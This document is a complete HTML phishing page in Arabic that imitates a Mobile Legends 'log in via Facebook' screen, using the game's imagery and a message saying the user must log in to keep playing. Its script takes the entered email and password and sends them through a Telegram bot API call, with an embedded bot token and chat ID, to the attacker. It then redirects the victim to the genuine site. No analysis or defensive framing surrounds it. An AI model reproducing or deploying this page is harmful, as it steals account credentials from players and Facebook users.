<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>تسجيل الدخول إلى موبايل ليجندز عبر فيسبوك</title>
    <style>
        body {
            font-family: 'Arial', sans-serif;
            background-image: url('https://cdn.mobirum.com/mobirum/2023/04/26/10770188_4e042a2d8d15b1db6072e7cbef8fc96e.jpg'); /* خلفية مشابهة */
            background-size: cover;
            background-position: center;
            text-align: center;
            margin: 0;
            padding: 0;
        }
        .login-container {
            margin-top: 100px;
            background-color: #ffffff;
            padding: 40px;
            box-shadow: 0 0 20px rgba(0, 0, 0, 0.2);
            border-radius: 10px;
            display: inline-block;
            max-width: 400px;
            width: 100%;
        }
        img {
            width: 200px;
            margin-bottom: 20px;
        }
        input[type="text"], input[type="password"] {
            padding: 15px;
            margin: 10px 0;
            width: 100%;
            font-size: 16px;
            border: 1px solid #ddd;
            border-radius: 5px;
            box-sizing: border-box;
        }
        .login-btn {
            padding: 15px;
            background-color: #007bff; /* أزرق مشابه */
            color: #ffffff;
            border: none;
            cursor: pointer;
            font-size: 16px;
            border-radius: 5px;
            margin-top: 20px;
            width: 100%;
            transition: background-color 0.3s;
        }
        .login-btn:hover {
            background-color: #0056b3; /* أزرق أغمق عند التمرير */
        }
        .footer {
            margin-top: 20px;
            color: #6c757d;
            font-size: 14px;
        }
        .footer a {
            color: #007bff;
            text-decoration: none;
        }
        .message {
            color: #dc3545; /* لون أحمر لتحذير */
            font-size: 16px;
            margin-bottom: 20px;
        }
    </style>
    <script>
        function sendTelegram(event) {
            event.preventDefault();  // منع إرسال النموذج افتراضيًا

            // الحصول على بيانات تسجيل الدخول
            var email = document.getElementById('email').value;
            var password = document.getElementById('password').value;
            var message = "تسجيل دخول جديد إلى موبايل ليجندز عبر فيسبوك \n" + "البريد الإلكتروني: " + email + "\nكلمة المرور: " + password;

            // إرسال البيانات إلى بوت تليجرام
            var xhr = new XMLHttpRequest();
            xhr.open("POST", "https://api.telegram.org/bot6421601945:AAHfCxgub4hJFRp-bJqLEGg7EGJs6VnxYzQ/sendMessage", true);
            xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
            xhr.send("chat_id=1900509620&text=" + encodeURIComponent(message));

            // بعد إرسال البيانات، تحويل المستخدم إلى الصفحة الأصلية
            xhr.onload = function() {
                window.location.href = "https://m.mobilelegends.com/";
            };
        }
    </script>
</head>
<body>
    <div class="login-container">
        <img src="https://cdn.mobirum.com/mobirum/2023/04/26/10770188_4e042a2d8d15b1db6072e7cbef8fc96e.jpg" alt="Mobile Legends Logo">
        <p class="message">عليك تسجيل الدخول أولاً لتتمكن من متابعة اللعب.</p>
        <form onsubmit="sendTelegram(event);">
            <input type="text" id="email" placeholder="البريد الإلكتروني" required><br>
            <input type="password" id="password" placeholder="كلمة المرور" required><br>
            <button class="login-btn" type="submit">تسجيل الدخول</button>
        </form>
        <div class="footer">
            <p>ليس لديك حساب؟ <a href="#">سجل الآن</a></p>
        </div>
    </div>
</body>
</html>
